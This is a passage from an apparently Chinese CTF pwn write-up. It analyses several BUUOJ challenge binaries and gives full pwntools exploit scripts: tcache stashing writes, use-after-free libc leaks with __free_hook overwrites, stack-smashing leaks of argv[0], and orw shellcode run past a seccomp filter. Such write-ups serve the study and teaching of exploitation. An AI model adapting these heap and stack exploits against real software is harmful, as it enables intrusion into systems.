class="hljs-string">'1'</span>*<span class="hljs-number">500</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><ul><li>还可以攻击<code>calloc_hook</code>,因为seccomp里面调用了calloc。</li><li>攻击io file 进行泄漏和orw。（先等待复现）<br><a href="https://github.com/Starssgo/pwn_challange/blob/master/domo/exp.py" target="_blank" rel="noopener">https://github.com/Starssgo/pwn_challange/blob/master/domo/exp.py</a></li></ul><h2 id="gyctf-2020-signin"><a href="#gyctf-2020-signin" class="headerlink" title="gyctf_2020_signin"></a><code>gyctf_2020_signin</code></h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><ul><li>uaf，但是存在一个flag位用于检测是否free过</li><li>edit只能一次</li><li>存在后门函数，其中还会用calloc申请一个chunk,并且只需要<code>0x004040C0</code>处有数值即可触发。</li></ul><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="calloc-的特性："><a href="#calloc-的特性：" class="headerlink" title="calloc 的特性："></a>calloc 的特性：</h4><ul><li>在申请到的chunk上会进行一个置零的操作</li><li>不会从tcache bin 中取chunk <h4 id="tcache-的-int-malloc有以下特性："><a href="#tcache-的-int-malloc有以下特性：" class="headerlink" title="tcache 的_int_malloc有以下特性："></a>tcache 的<code>_int_malloc</code>有以下特性：</h4></li></ul><p>在分配 fastbin 中的 chunk 时，若此chain上还有其他chunk ，则调用<code>tcache_put</code>把它们全部放入 tcache 中(smallbins中也是如此)。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-comment">/* While we're here, if we see other chunks of the same size, stash them in the tcache.  */</span>  <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (nb);  <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)&#123;  mchunkptr tc_victim;  <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span>  <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count     &amp;&amp; (pp = *fb) != <span class="hljs-literal">NULL</span>)    &#123;      REMOVE_FB (fb, tc_victim, pp);      <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)    &#123;      tcache_put (tc_victim, tc_idx);&#125;    &#125;&#125;</code></pre></div><h3 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>申请8个堆， 释放8个堆，最后一个会进入fastbin</li><li>edit idx=8 的chunk，改其fd为<code>0x004040C0 - 0x10</code></li><li>申请一个chunk，此时会在tcache chain中拿走一个，留出一个空位</li><li>调用后门函数，其中calloc会从fastbin中拿出idx=8的chunk，但是由于其特性，会把剩下的fd上地址也当作一个chunk丢进tcache</li><li>丢进时是丢在tcache的头部，所以会跟tcache 进行一个link。也就是会在这个fd地址上写下，tcache chain 上其紧挨着的chunk地址。这就造成一个任意地址写。</li></ul><p>漏洞产生原因也是，libc源码中<code>tcache_put</code>基本没有安全检查。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./gyctf_2020_signin'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27592</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'your choice?'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'your choice?'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    s(str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'your choice?'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):    add(i)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):    free(i)edit(<span class="hljs-number">7</span>,p64(<span class="hljs-number">0x4040C0</span><span class="hljs-number">-0x10</span>))add(<span class="hljs-number">8</span>)sla(<span class="hljs-string">'your choice?'</span>,<span class="hljs-string">'6'</span>)debug()itr()</code></pre></div><h3 id="题记"><a href="#题记" class="headerlink" title="题记"></a>题记</h3><p>在做的时候，开始有个想法，malloc申请堆时，会在其返回地址的上方留下size信息，以此来利用。但是在验证后，发现是不会的。</p><h2 id="gyctf-2020-document"><a href="#gyctf-2020-document" class="headerlink" title="gyctf_2020_document"></a><code>gyctf_2020_document</code></h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><ul><li>存在uaf漏洞</li><li>只能申请一个0x20、0x90的堆块，不能进行fastbin进行攻击。</li></ul><h4 id="person数据结构"><a href="#person数据结构" class="headerlink" title="person数据结构"></a>person数据结构</h4><div class="hljs"><pre><code class="hljs undefined">                                                                                                   <span class="angelscript">┌──────────────────────┬────┐              │                      │<span class="hljs-number">0x21</span>│              ├─────────────┬────────┴────┤              │             │             │              │   main_heap │    flag     │              ├─────────────┴─────────────┤              │                       <span class="hljs-number">0x91</span>│              │─────────────┬─────────────┤              │             │             ├──────▶<span class="hljs-number">0x10</span>   │     name    │      sex    │              ├─────────────▼─────────────┤              │                           │              │                           │              │                           │              │                           │              │                           │              │          data             │              │                           │       ┌────┐ │                           ├──────▶│<span class="hljs-number">0x80</span>│ │                           │       └────┘ │                           │              │                           │              │                           │              │                           │              └───────────────────────────┘</span></code></pre></div><h3 id="攻击思路-2"><a href="#攻击思路-2" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>释放一个0x90的堆，利用uaf进行泄漏libc</li><li>申请2个堆，此时在这个0x90的unsortbin会留下2个0x20的person数据结构的头</li><li>edit这个释放的堆，控制其中<code>main_heap</code>的地址，然后进行任意地址写。</li></ul><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./gyctf_2020_document'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25009</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(name,sex,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)    sa(<span class="hljs-string">'name'</span>,str(name))    sa(<span class="hljs-string">'sex'</span>,str(sex))    sa(<span class="hljs-string">'infor'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'index'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,sex,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sa(<span class="hljs-string">'sex'</span>,str(sex))    sa(<span class="hljs-string">'infor'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'index'</span>,str(idx))data = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x78</span>add(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'W'</span>,data)add(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'W'</span>,data)free(<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)r()libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b78</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)add(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'W'</span>,data)add(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'W'</span>,data)free_hook = <span class="hljs-number">0x3c67a8</span> + libc_basedata = <span class="hljs-string">'\x00'</span>* <span class="hljs-number">8</span> + p64(<span class="hljs-number">0x71</span>) + p64(free_hook<span class="hljs-number">-0x10</span>) + <span class="hljs-string">'\x01'</span> * <span class="hljs-number">0x58</span>edit(<span class="hljs-number">0</span>,<span class="hljs-string">"N"</span>,data)data = p64(libc_base + <span class="hljs-number">0x4526a</span>) + <span class="hljs-number">0x68</span> * <span class="hljs-string">'\x00'</span>edit(<span class="hljs-number">3</span>,<span class="hljs-string">'N'</span>,data)free(<span class="hljs-number">0</span>)itr()</code></pre></div><h2 id="wdb-2018-guess"><a href="#wdb-2018-guess" class="headerlink" title="wdb_2018_guess"></a><code>wdb_2018_guess</code></h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>主要就是利用stack smashing。</p><h4 id="stack-smashing"><a href="#stack-smashing" class="headerlink" title="stack smashing"></a>stack smashing</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 <code>__stack_chk_fail</code>函数来打印 <code>argv[0]</code> 指针所指向的字符串，正常情况下，这个指针指向了程序名。其代码如下</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="hljs-keyword">void</span>)&#123;  __fortify_fail (<span class="hljs-string">"stack smashing detected"</span>);&#125;<span class="hljs-keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *msg)&#123;  <span class="hljs-comment">/* The loop is added only to keep gcc happy.  */</span>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)    __libc_message (<span class="hljs-number">2</span>, <span class="hljs-string">"*** %s ***: %s terminated\n"</span>,                    msg, __libc_argv[<span class="hljs-number">0</span>] ?: <span class="hljs-string">"&lt;unknown&gt;"</span>);&#125;</code></pre></div><p>所以说如果我们利用栈溢出覆盖 <code>argv[0]</code> 为我们想要输出的字符串的地址，那么在 <strong><code>fortify_fail</code> 函数中就会输出我们想要的信息。</strong></p><p>注意其是%s来打印东西的，所以在利用时要用<code>argv[0]</code>做个跳板。</p><h5 id="如何获取栈值"><a href="#如何获取栈值" class="headerlink" title="如何获取栈值"></a>如何获取栈值</h5><p><a href="https://blog.csdn.net/chennbnbnb/article/details/104035261" target="_blank" rel="noopener">https://blog.csdn.net/chennbnbnb/article/details/104035261</a></p><p>Libc上的<code>_environ</code>存放着当前进程的环境变量，其是一个栈地址。</p><p>以此来获取栈值，然后根据偏移来访问栈中的数据。</p><h3 id="攻击思路-3"><a href="#攻击思路-3" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>获取libc基地址</li><li>获取stack地址，根据偏移找到存放flag的stack address</li><li>覆盖<code>argv[0]</code>为flag的stack address</li></ul><p>其中每次都是用gets 覆盖到覆盖<code>argv[0]</code>  ,stack smashing来完成。</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./GUESS'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26813</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()data = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x128</span> + p64(elf.got[<span class="hljs-string">'__libc_start_main'</span>])sla(<span class="hljs-string">'flag'</span>,data)ru(<span class="hljs-string">'hing detected ***: '</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x20740</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)data = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x128</span> + p64(libc.sym[<span class="hljs-string">'_environ'</span>] + libc_base)sla(<span class="hljs-string">'flag'</span>,data)ru(<span class="hljs-string">'hing detected ***: '</span>)stack_flag = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x168</span>info_addr(<span class="hljs-string">'stack_base'</span>,stack_flag)data = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x128</span> + p64(stack_flag)sla(<span class="hljs-string">'flag'</span>,data)itr()</code></pre></div><h2 id="suctf-2018-basic-pwn"><a href="#suctf-2018-basic-pwn" class="headerlink" title="suctf_2018_basic pwn"></a><code>suctf_2018_basic pwn</code></h2><p>无脑栈溢出</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./SUCTF_2018_basic_pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25741</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()data = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x118</span> + p64(<span class="hljs-number">0x000000401157</span>)sl(data)itr()</code></pre></div><h2 id="SWPUCTF-2019-p1KkHeap"><a href="#SWPUCTF-2019-p1KkHeap" class="headerlink" title="SWPUCTF_2019_p1KkHeap"></a><code>SWPUCTF_2019_p1KkHeap</code></h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><ul><li>开了沙箱，可以orw拿到flag</li><li>功能只能调用18次，free只能3次</li><li>free中存在uaf</li><li>mmap了一块 rwx的内存在 <code>0x66660000</code></li></ul><h3 id="攻击思路-4"><a href="#攻击思路-4" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>泄漏heap base，准备攻击tcache bin的表头</li><li>覆盖bin counts为7，伪造满bin，free chunk，泄漏libc</li><li>攻击tcache bin的表头中bin chunk header 的部分，放下<code>0x66660000</code> 和<code>malloc_hook</code>，准备修改这两个部分。</li><li>在<code>0x66660000</code>的内存上写下orw的shellcode</li><li>攻击<code>malloc_hook</code>为<code>0x66660000</code> 取得flag</li></ul><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./SWPUCTF_2019_p1KkHeap'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29911</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-string">'''================================================================================ line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x07 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0011 0004: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0011 0005: 0x15 0x00 0x04 0x00000001  if (A != write) goto 0010 0006: 0x20 0x00 0x00 0x00000024  A = count &gt;&gt; 32 # write(fd, buf, count) 0007: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0010 0008: 0x20 0x00 0x00 0x00000020  A = count # write(fd, buf, count) 0009: 0x15 0x01 0x00 0x00000010  if (A == 0x10) goto 0011 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0011: 0x06 0x00 0x00 0x00000000  return KILL'''</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'id'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'id'</span>,str(idx))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'id'</span>,str(idx))add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#0</span>free(<span class="hljs-number">0</span>)free(<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)ru(<span class="hljs-string">'content: '</span>)heap_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x260</span>info_addr(<span class="hljs-string">'heap_base'</span>,heap_base)add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#1</span>edit(<span class="hljs-number">1</span>,p64(heap_base+<span class="hljs-number">0x10</span>))add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#2</span>add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#3</span>debug()data = p64(<span class="hljs-number">8</span>) + <span class="hljs-string">'\x07'</span>*<span class="hljs-number">8</span>edit(<span class="hljs-number">3</span>,data)add(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#4</span>free(<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)ru(<span class="hljs-string">'content: '</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ebca0</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)data = p64(<span class="hljs-number">8</span>) + <span class="hljs-string">'\x07'</span>*<span class="hljs-number">8</span> + <span class="hljs-string">'\x00'</span> * (<span class="hljs-number">0xc0</span> - <span class="hljs-number">0x20</span>) + p64(<span class="hljs-number">0x3ebc30</span> + libc_base) +p64(<span class="hljs-number">0x66660000</span>) edit(<span class="hljs-number">3</span>,data)add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#5</span>orw = shellcraft.open(<span class="hljs-string">'flag'</span>)orw += shellcraft.read(<span class="hljs-number">3</span>,<span class="hljs-number">0x66660100</span>,<span class="hljs-number">0x64</span>)orw +=shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-number">0x66660100</span>,<span class="hljs-number">0x64</span>)edit(<span class="hljs-number">5</span>,asm(orw))add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#6</span>edit(<span class="hljs-number">6</span>,p64(<span class="hljs-number">0x66660000</span>))add(<span class="hljs-number">1</span>)itr()</code></pre></div><h3 id="题记-1"><a href="#题记-1" class="headerlink" title="题记"></a>题记</h3><p>在学习别人的exp时，发现还有泄漏libc的另外一种办法，这种办法泄漏出libc，也使得整个exp，基本跟我的不大相同。</p><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p><strong>在tcache bin的表头中，其每个大小tcache bin的count(0-7) 